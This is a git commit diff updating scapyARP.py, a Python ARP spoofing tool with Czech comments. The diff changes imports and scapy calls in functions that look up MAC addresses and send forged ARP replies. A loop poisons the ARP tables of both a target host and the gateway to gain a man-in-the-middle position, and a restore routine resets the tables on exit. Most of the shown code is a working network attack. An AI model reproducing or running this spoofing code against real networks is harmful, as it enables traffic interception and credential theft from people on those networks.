afab54e498498849c3999006afe1f6d0bad81911
miblaha <49722024+miblaha@users.noreply.github.com>
2021-04-24 22:14:23 +0200

    Update scapyARP.py

--- scapyARP.py
+++ scapyARP.py
@@ -1,4 +1,5 @@
-import scapy.all as scapy
+import scapy.layers.l2
+from scapy.all import *
 import time
 import argparse
 
@@ -15,10 +16,10 @@ def get_arguments():
 
 # Ziska MAC adresu za pomoci IP adresy
 def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request = scapy.layers.l2.ARP(pdst=ip)
+    broadcast = scapy.layers.l2.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=10,
+    answered_list = scapy.layers.l2.srp(arp_request_broadcast, timeout=10,
                               verbose=False)[0]
     answered_list.show()
     return answered_list[0][1].hwsrc
@@ -27,18 +28,18 @@ def get_mac(ip):
 # Zmeni MAC adresu v ARP tabulce
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+    packet = scapy.layers.l2.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                        psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    scapy.sendrecv.send(packet, verbose=False)
 
 
 # Obnovi puvodni MAC adresu v ARP tabulce
 def obnov(dest_ip, source_ip):
     dest_mac = get_mac(dest_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+    packet = scapy.layers.l2.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                        psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
+    scapy.sendrecv.sendp(packet, count=4, verbose=False)
 
 
 options = get_arguments()
@@ -49,8 +50,8 @@ try:
         spoof(options.target, options.gateway)
         spoof(options.gateway, options.target)
 
-        odeslane_packety += 4
-        print(f"\r[+] Packetu poslano: {odeslane_packety}", end="")
+        odeslane_packety += 2
+        print(f"\r[+] Packetu poslano: {odeslane_packety} \n", end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\nCTRL+C .. Obnovuji ARP tabulky.")
